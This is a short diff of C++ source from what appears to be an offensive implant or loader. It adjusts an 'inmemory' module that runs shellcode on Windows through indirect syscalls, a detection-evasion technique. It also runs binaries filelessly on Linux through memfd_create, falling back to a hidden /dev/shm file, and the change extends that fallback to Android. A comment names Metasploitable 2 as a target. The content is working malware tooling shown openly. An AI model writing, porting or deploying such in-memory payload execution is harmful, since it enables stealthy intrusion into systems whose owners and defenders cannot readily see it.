@@ -23,9 +23,8 @@
 
 namespace inmemory {
 
-#include "syscalls.h"
-
 #ifdef _WIN32
+#include "syscalls.h"
 // Execute Shellcode on Windows using Indirect Syscalls
 inline bool run_shellcode(const std::vector<unsigned char>& shellcode) {
     if (shellcode.empty()) return false;
@@ -64,9 +63,11 @@ inline bool run_binary(const std::vector<unsigned char>& binary, const std::stri
     if (binary.empty()) return false;
 
     // Try to create an anonymous file in memory (Modern Linux, Kernel 3.17+)
-    int fd = memfd_create("phantom_mem", MFD_CLOEXEC);
-    
-    // Fallback for older kernels (like Metasploitable 2)
+    int fd = -1;
+#ifndef __ANDROID__
+    fd = memfd_create("phantom_mem", MFD_CLOEXEC);
+#endif
+    // Fallback for older kernels (like Metasploitable 2) and Android
     if (fd == -1) {
         char tmp_path[] = "/dev/shm/.phntmXXXXXX";
         fd = mkstemp(tmp_path);
